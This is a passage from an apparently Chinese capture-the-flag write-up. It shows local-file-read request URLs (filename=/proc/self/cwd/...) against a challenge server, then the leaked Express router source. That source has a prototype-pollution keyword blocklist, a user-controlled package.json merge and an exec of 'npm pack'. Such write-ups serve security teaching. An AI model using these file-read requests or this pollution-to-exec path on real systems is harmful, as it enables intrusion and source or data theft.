class="string">&quot;/&quot;</span>,indexRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/user&quot;</span>,userRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/dashboardIndex&quot;</span>,dashboardIndexRouter);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>,<span class="function">() =&gt;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening on <span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后根据这个代码</p><p><img src="../images/image-20230504193939368.png" alt="image-20230504193939368"></p><p><img src="../images/image-20230504194038107.png" alt="image-20230504194038107"></p><p>这就是引入的一个文件，于是我们尝试进行这个文件的读取，看里面有啥功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一开始还报错是因为没有加后缀.js，就好像访问php页面不加php一样</span><br><span class="line">http://139.196.153.118:32707/dashboardIndex/ShowExampleFile?filename=/proc/self/cwd/routes/dashbo</span><br><span class="line">ardIndex.js</span><br><span class="line"></span><br><span class="line">这个路径可能也是这个框架默认的路径吧，应该和thinkphp差不多</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://139.196.153.118:32707/dashboardIndex/ShowExampleFile?filename=./routes/dashboardIndex.js</span><br><span class="line">上面的二种方法都可以实现</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230504194423815.png" alt="image-20230504194423815"></p><p>读取到的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&quot;multer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; <span class="attr">dest</span>: path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/tmp&quot;</span>)&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFileData</span>(<span class="params">fileDatas</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> blacklist = [<span class="string">&#x27;__proto__&#x27;</span>, <span class="string">&#x27;prototype&#x27;</span>, <span class="string">&#x27;constructor&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; blacklist.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileDatas.<span class="title function_">includes</span>(blacklist[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get example file</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/ShowExampleFile&quot;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>([req.<span class="property">query</span>].<span class="title function_">some</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> item &amp;&amp; <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(item).<span class="title function_">includes</span>(<span class="string">&quot;app&quot;</span>)))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Hacker!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">filename</span> || <span class="string">&quot;./example/example.json&quot;</span>).<span class="title function_">toString</span>());</span><br><span class="line">    &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Internal server error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Homepage</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/Home&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>:<span class="string">&quot;Welcome back&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/getHint2&quot;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> hintName = <span class="string">&quot;hint2.png&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> options = &#123;</span><br><span class="line">        <span class="attr">root</span>: path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../hints&quot;</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(hintName,options,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Get hint2 error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// show uploaded files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/UploadList&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> lists = fs.<span class="title function_">readdirSync</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/upload&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (lists.<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;No uploaded files&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: lists,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// show packed files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PacksList&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> lists = fs.<span class="title function_">readdirSync</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/packs&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (lists.<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;No packed files&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; lists.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        result += <span class="string">&quot;&lt;a href=&#x27;/dashboardIndex/DownloadPackage?name=&quot;</span> + lists[i] + <span class="string">&quot;&#x27;&gt;&quot;</span> + lists[i] + <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: result,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Download packed files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/DownloadPackage&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">name</span> === <span class="literal">undefined</span> || req.<span class="property">query</span>.<span class="property">name</span> === <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        req.<span class="property">query</span>.<span class="property">name</span> = <span class="string">&quot;example.tgz&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> packageName = req.<span class="property">query</span>.<span class="property">name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;/&quot;</span>) !== -<span class="number">1</span> || packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;..&quot;</span>) !== -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;File path invalid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;.tgz&quot;</span>) === -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Not a package file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> packagePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/packs/&quot;</span>,packageName);</span><br><span class="line">    <span class="keyword">if</span>(!fs.<span class="title function_">existsSync</span>(packagePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;File not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> contentType = <span class="string">&quot;application/x-gtar&quot;</span>;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-disposition&quot;</span>, <span class="string">&quot;attachment; filename=&quot;</span> + packageName);</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-type&quot;</span>, contentType);</span><br><span class="line">    res.<span class="title function_">download</span>(packagePath,packageName,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Download failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Upload files</span></span><br><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/Upload&quot;</span>,upload.<span class="title function_">any</span>(),<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;upload&quot;</span>,&#123;<span class="attr">upload_result</span>:<span class="string">&quot;plz upload file&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!req.<span class="property">files</span> || <span class="title class_">Object</span>.<span class="title function_">keys</span>(req.<span class="property">files</span>).<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;No files were uploaded&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> file = req.<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (file.<span class="property">originalname</span>.<span class="title function_">includes</span>(<span class="string">&quot;/&quot;</span>) || file.<span class="property">originalname</span>.<span class="title function_">includes</span>(<span class="string">&quot;..&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File path invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> fileData = fs.<span class="title function_">readFileSync</span>(file.<span class="property">path</span>).<span class="title function_">toString</span>(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(fileData))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File data invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/upload/&quot;</span>,file.<span class="property">originalname</span>);</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="title function_">extname</span>(file.<span class="property">originalname</span>) === <span class="string">&quot;.json&quot;</span>) &#123;</span><br><span class="line">            fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File upload error&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File upload success&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;Not a JSON file&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set dependencies</span></span><br><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/SetDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;You can post the dependencies here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> data = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data !== <span class="string">&quot;object&quot;</span> &amp;&amp; data === &#123;&#125;)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;plz set the dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> exampleJson = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line">            <span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;echo &#x27;packing dependencies&#x27;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">            <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        exampleJson = <span class="title class_">Object</span>.<span class="title function_">assign</span>(exampleJson,&#123;&#125;,data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/package.json&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> fileData = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(exampleJson);</span><br><span class="line"></span><br><span class="line">        fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies error&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pack dependencies</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PackDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Packing dependencies...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;cd &quot;</span> + filePath + <span class="string">&quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title 